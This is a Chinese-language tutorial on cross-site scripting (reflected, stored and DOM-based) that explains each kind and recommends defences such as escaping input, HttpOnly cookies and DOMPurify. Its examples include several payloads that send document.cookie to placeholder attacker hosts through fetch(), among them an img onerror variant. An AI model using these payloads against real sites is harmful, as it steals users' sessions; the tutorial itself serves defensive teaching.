[toc]

# XSS 攻击

## 1. 前言

XSS (Corss Site Scripting)也即跨站脚本攻击，攻击出现的原因一般是因为 Web 程序对用于的输入过滤不足导致的一种漏洞，攻击者可以把恶意的脚本代码注入到网页之中，当其他用户浏览时就会执行其中的恶意代码，对受害者产生各种攻击。XSS 一般分为三种类型：

反射型，存储型，DOM型

## 2. 反射型(url)

反射型 XSS 攻击的恶意脚本并没有被存储到后端数据库中，而是诱导用户点击某个精心凭借的恶意链接，从而达到攻击的目的。

举个例子：

```js
// 当用户在搜索时，比如
http://www.xxx.com/music?name='青花瓷'
```

后端假设返回搜索的name，而这时候攻击者在 url 后面拼接一个恶意的script，如 alert(1);

```js
http://www.xxx.com/music?name='青花瓷'<script>alert(1)</script>
```

又假如拼接的是一个 documen.cookie呢？然后将这个cookie发到它自己的电脑上，cookie就被盗取了

```js
http://www.xxx.com/music?name='青花瓷'<script>fetch(`http://恶意者的网站.com/>cookie=${document.cooki}`)</script>
```

造成反射型 XSS 攻击的原因是服务端没有过滤scritp， 所以解决方案很简单，在服务器对用户的输入进行过滤，过滤方案很多。

一种方式是对用户输入进行 encode，比如：

```js
${encodeURIComponent(req.query.name)
```

第二种方式就是替换掉特殊字符，比如 `<` `&` 等，只要替换掉，自然就不会解析了

```js
function replaceSpecialSymbol(str) {
	return str
					.replace(/&/g, '&amp;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&apos;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;');
}
```

另外，如果后端登录验证是基于 cookie的话，最好将其设置为 HttpOnly,这样攻击者就无法利用 JS 脚本在前端获取到 Cookie了

## 3. 存储型（表单）

与反射型不同，存储型 XSS 攻击是指当用户的输入包含了恶意脚本，服务端未经过转义就存储到数据库，访问页面会触发恶意脚本执行，而导致的攻击。

假如在某网站上有一篇爆款文章：`https://xxx.com/articles/1`

攻击者在文章下面发表了一篇评论，内容中包含了 script 脚本：

```ba'sh
文章写的真棒！<script>fetch(`http://attack.com/cookies?cookie=${document.cookie}`)</script>
```

如果服务端直接把评论字符串保存到数据库了，下次只要有用户访问该文章时，包含恶意脚本的评论内容被返回，把当前用户的 cookie 发送到攻击者的服务器！

可以看到，用户的 Cookie 马上被发送到了攻击者的服务器。其实这种获取 Cookie 的方式还算小打小闹了，只要能够利用 xss 注入 script，黑客真的是可以「为所欲为」，例如黑客通过操作 DOM 的方式，分分钟把你的网站变成赌博网站、色情网站...，

可以看到，存储型 XSS 也是因为恶意代码未经转义直接被插入到响应的 HTML 里的，然后被浏览器执行导致攻击，所以解决方案也是对用户输入进行过滤，过滤方案与上面讲的反射型一致。

## 4. DOM型（onerror）

DOM 型 XSS 与反射型或存储型 XSS 的区别在于，DOM 型在服务器返回的网页或脚本中是看不到恶意代码的，而是在更新 DOM 树的时候触发了恶意脚本的执行。

我们来看一则模拟案例，前端开发人员未经过滤就直接把用户输入插入到 HTML 中：

```html
<input id="input" type="text" />
<button onclick="container.innerHTML = input.value">点击</button>
<p id="container"></p>
```

试想一下，如果此时用户输入了下面一段恶意脚本的话会发生什么？

```bash
<script>fetch(`https://attack.com?cookie=${document.cookie}`)</script>
```

值得庆幸的是，大部分现代浏览器都实现了 HTML5 的 [安全规范](https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML)

但是这就足够安全了吗？非也，请看下面的输入：

```html
<img src="x" onerror="fetch(`http://attack.com/cookies?cookie=${document.cookie}`)" />
```

恶意脚本依然在 onerror 回调中被触发了！

## 5. 防御方案

这里推荐使用 [DOMPurify](https://github.com/cure53/DOMPurify) 库对用户的输入进行过滤，然后再使用 innerHTML 插入到 DOM 中。

